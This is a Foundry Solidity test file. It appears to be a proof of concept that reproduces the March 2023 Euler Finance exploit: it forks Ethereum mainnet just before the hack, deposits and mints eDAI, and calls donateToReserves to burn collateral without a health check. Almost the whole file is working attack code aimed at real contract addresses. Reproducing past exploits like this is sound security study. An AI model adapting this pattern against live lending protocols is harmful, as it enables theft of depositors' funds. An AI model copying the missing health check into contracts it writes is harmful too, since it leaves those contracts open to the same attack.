// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

/*
 * @title   Euler Finance Donation Exploit (March 2023)
 * @author  Yudis-bit
 * @notice  Proof of Concept demonstrating the vulnerability in Euler's donateToReserves
 * @dev     Fork block: 16817995 (just before the hack)
 * 
 * Vulnerability: The donateToReserves function lacked a health check (checkLiquidation modifier),
 * allowing an attacker to burn their own eTokens (collateral) without reducing their debt (dTokens),
 * leading to undercollateralized positions and potential liquidation bypass.
 *
 * Attack steps:
 * 1. Deposit DAI into Euler to receive eDAI (interest-bearing collateral token)
 * 2. Mint eDAI (or borrow DAI via dToken) to create debt
 * 3. Call donateToReserves to burn eTokens without checking account health
 * 4. Result: Collateral decreases while debt remains, breaking the protocol's accounting
 */

interface IEToken {
    function deposit(uint256 subAccountId, uint256 amount) external;
    function mint(uint256 subAccountId, uint256 amount) external;
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Exploit_2023_03_EulerFinance is Test {
    // Mainnet addresses at block 16817995
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant E_DAI = 0xe025E3ca2bE02316033184551D4d3Aa22024D9DC;   // eDAI proxy
    address constant EULER_MODULE = 0x27182842E098f60e3D576794A5bFFb0777E025d3; // Euler main module

    IERC20 dai = IERC20(DAI);
    IEToken eDAI = IEToken(E_DAI);

    function setUp() public {
        // Create an archival fork at the exact block before the exploit
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 16817995);
        // Give the contract 100,000 DAI
        deal(DAI, address(this), 100_000 ether);
        // Approve the Euler module (not the eToken) to spend DAI
        dai.approve(EULER_MODULE, type(uint256).max);
    }

    function test_EulerDonationExploit() public {
        emit log("=== PRE-ATTACK STATE ===");
        emit log_named_uint("Attacker DAI Balance", dai.balanceOf(address(this)) / 1e18);

        // Step 1: Deposit DAI to receive eDAI (collateral)
        eDAI.deposit(0, 100_000 ether);
        uint256 balanceAfterDeposit = eDAI.balanceOf(address(this));
        emit log_named_uint("eDAI balance after deposit", balanceAfterDeposit);

        // Step 2: Mint additional eDAI (simulating leveraged position or debt creation)
        eDAI.mint(0, 200_000 ether);
        uint256 balanceAfterMint = eDAI.balanceOf(address(this));
        emit log_named_uint("eDAI balance after mint", balanceAfterMint);

        // Step 3: Exploit - Donate eDAI to reserves (burns attacker's eTokens without health check)
        eDAI.donateToReserves(0, 100_000 ether);
        uint256 balanceAfterDonate = eDAI.balanceOf(address(this));
        emit log_named_uint("eDAI balance after donate", balanceAfterDonate);

        // Verification: The donation must have reduced the attacker's eDAI balance
        assertLt(balanceAfterDonate, balanceAfterMint, "Donation did not reduce eDAI balance");

        emit log("=== EXPLOIT SUCCESSFUL ===");
        emit log("Attacker successfully burned eTokens without liquidation.");
    }
}
